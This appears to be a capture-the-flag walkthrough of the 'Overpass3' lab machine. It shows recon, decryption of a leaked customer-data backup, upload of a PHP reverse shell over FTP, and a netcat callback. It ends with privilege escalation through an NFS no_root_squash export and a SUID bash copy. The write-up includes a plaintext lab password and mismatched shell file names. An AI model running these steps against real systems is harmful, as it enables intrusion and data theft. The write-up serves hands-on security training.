# Overpass3

## 1. Recon

we run the nmap scan and the gobuster parallely, while we explore the website.

### 1.1 Port Scanning
```
❯ nmap -script=vuln -sV -A -T4 -Pn 10.10.16.10
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-06 21:54 EST
Nmap scan report for 10.10.16.10
Host is up (0.52s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_sslv2-drown: 
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /backups/: Backup folder w/ directory listing
|_  /icons/: Potentially interesting folder w/ directory listing
|_http-server-header: Apache/2.4.37 (centos)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-trace: TRACE is enabled
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.52 seconds
```

### 1.2 Web Enumeration + Exploration
`❯ gobuster dir -u 10.10.16.10 -w "/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt" -x "html,php,txt"`

well this didn't workout well. But, from the nmap scan, we have two directories listed:

`/backups/ & /icons/`

`/icons/` did not have anything interesting, so lets look at `/backups/`. We have a zip file as `backup.zip`. Downloading and unzipping,

```
❯ unzip backup.zip
Archive:  backup.zip
 extracting: CustomerDetails.xlsx.gpg  
  inflating: priv.key 
```

```
❯ gpg --import priv.key
gpg: key C9AE71AB3180BC08: "Paradox <paradox@overpass.thm>" not changed
gpg: key C9AE71AB3180BC08: secret key imported
gpg: Total number processed: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:  secret keys unchanged: 1
```

```
❯ gpg CustomerDetails.xlsx.gpg
gpg: WARNING: no command supplied.  Trying to guess what you mean ...
gpg: encrypted with 2048-bit RSA key, ID 9E86A1C63FB96335, created 2020-11-08
      "Paradox <paradox@overpass.thm>"
```

Nice, we have all the customer details neatly bundled up for us. Now, lets convert the `xlsx` to `pdf`.

So we have some customer names and their username-password combinations and, some credit card information XD

### 1.3 FTP
lets try logging in using this from ftp. `paradox` username works! okay okay. lets try putting a file on the server using `put filename`. So that works too. Lets upload a php reverse shell and see how that works. Don't forget to change the `$ip` to your `tun0`, or the relevant `tun`.

```
❯ ftp 10.10.181.222
...
ftp> pwd
257 "/" is the current directory
ftp> put phpreverseshell.php
...
ftp> ls
...
-rw-r--r--    1 1001     1001         5494 Mar 07 03:10 phpreverseshell.php
226 Directory send OK.
```


## 2. Foothold
Setup netcat to listen on the port specified. I did not change so its `1337` for me. 

`❯ nc -lnvp 1337`

So, lets execute the shell on there. How? just curl!

`❯ curl 10.10.16.10/shell.php`

```
❯ nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.8.150.214] from (UNKNOWN) [10.10.181.222] 38004
Linux localhost.localdomain 4.18.0-193.el8.x86_64 #1 SMP Fri May 8 10:59:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 03:12:19 up 17 min,  0 users,  load average: 0.00, 0.41, 0.89
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: cannot set terminal process group (874): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4$ whoami
whoami
apache
sh-4.4$ pwd
/
pwd
sh-4.4$ 
```

## 3. Priv Esc

let's first get the web flag:
```
sh-4.4$ cd ~
cd ~
sh-4.4$ ls
ls
error
icons
noindex
web.flag
sh-4.4$ cat web.flag
cat web.flag
thm{NOICE}
sh-4.4$ 
```

Converting to a python shell using `python3 -c "import pty; pty.spawn('/bin/bash')"`, lets focus on privesc.

```
bash-4.4$ su paradox
su paradox
Password: ShibesAreGreat123

[paradox@localhost html]$ whoami
whoami
paradox
```

Since we can transfer files using ftp, we can put in `linpeas.sh`


```
[+] Searching ssl/ssh files
/home/paradox/.ssh/authorized_keys                              
/home/paradox/.ssh/id_rsa.pub  /usr/bin/passwd
Possible private SSH keys were found!
/home/paradox/priv.key
```

```
[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe                          
/home/james *(rw,fsid=0,sync,no_root_squash,insecure)           
```

```
Files with capabilities:
/usr/bin/newgidmap = cap_setgid+ep
/usr/bin/newuidmap = cap_setuid+ep
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
```

Okay. the NFS thing was full red in color. [Why no_root_squash is not a good idea](http://blog.serverbuddies.com/why-we-should-not-use-the-no_root_squash-option/). We have lots of scope there. To find out what port its running on, we can look at the nmap scan results. However, we can't see it there. It must be filtered or blocked. In any case, we can look for it, by:

```
[paradox@localhost home]$ rpcinfo -p
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100024    1   udp  49444  status
    100024    1   tcp  45735  status
    100005    1   udp  20048  mountd
    100005    1   tcp  20048  mountd
    100005    2   udp  20048  mountd
    100005    2   tcp  20048  mountd
    100005    3   udp  20048  mountd
    100005    3   tcp  20048  mountd
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
    100021    1   udp  56460  nlockmgr
    100021    3   udp  56460  nlockmgr
    100021    4   udp  56460  nlockmgr
    100021    1   tcp  32803  nlockmgr
    100021    3   tcp  32803  nlockmgr
    100021    4   tcp  32803  nlockmgr
```

Its at the port 2049, which is the default for NFS.

```
❯ ssh paradox@10.10.181.222 -L 2049:localhost:2049
Enter passphrase for key '/home/tanishq/.ssh/id_rsa': 
Last login: Sun Mar  7 04:22:48 2021 from 10.8.150.214
[paradox@localhost ~]$ 
```

```
❯ sudo mount -v -t nfs localhost:/ /home/tanishq/mnt
mount.nfs: timeout set for Sun Mar  7 00:12:57 2021
mount.nfs: trying text-based options 'vers=4.2,addr=::1,clientaddr=::1'
```

```
total 1228
drwx------  3 tanishq tanishq     124 Mar  7 00:36 .
drwxr-xr-x 33 tanishq tanishq    4096 Mar  7 00:36 ..
-rwxr-xr-x  1 root    root    1234376 Mar  7 00:36 bash
lrwxrwxrwx  1 root    root          9 Nov  8 16:45 .bash_history -> /dev/null
-rw-r--r--  1 tanishq tanishq      18 Nov  8  2019 .bash_logout
-rw-r--r--  1 tanishq tanishq     141 Nov  8  2019 .bash_profile
-rw-r--r--  1 tanishq tanishq     312 Nov  8  2019 .bashrc
drwx------  2 tanishq tanishq      61 Nov  7 21:20 .ssh
-rw-------  1 tanishq tanishq      38 Nov 17 16:15 user.flag
```

`❯ cat id_rsa >> /relevant/path/here/james.key`


```
❯ chmod 600 james.key
❯ ssh -i james.key james@10.10.179.112
Last login: Wed Nov 18 18:26:00 2020 from 192.168.170.145
[james@localhost ~]$ 
```

```
[james@localhost ~]$ ls
bash  user.flag
[james@localhost ~]$ ./bash
./bash: /lib64/libtinfo.so.6: no version information available (required by ./bash)
bash-5.1$ whoami
james
bash-5.1$ ./bash -p
./bash: /lib64/libtinfo.so.6: no version information available (required by ./bash)
bash-5.1# whoami
root
```

:D
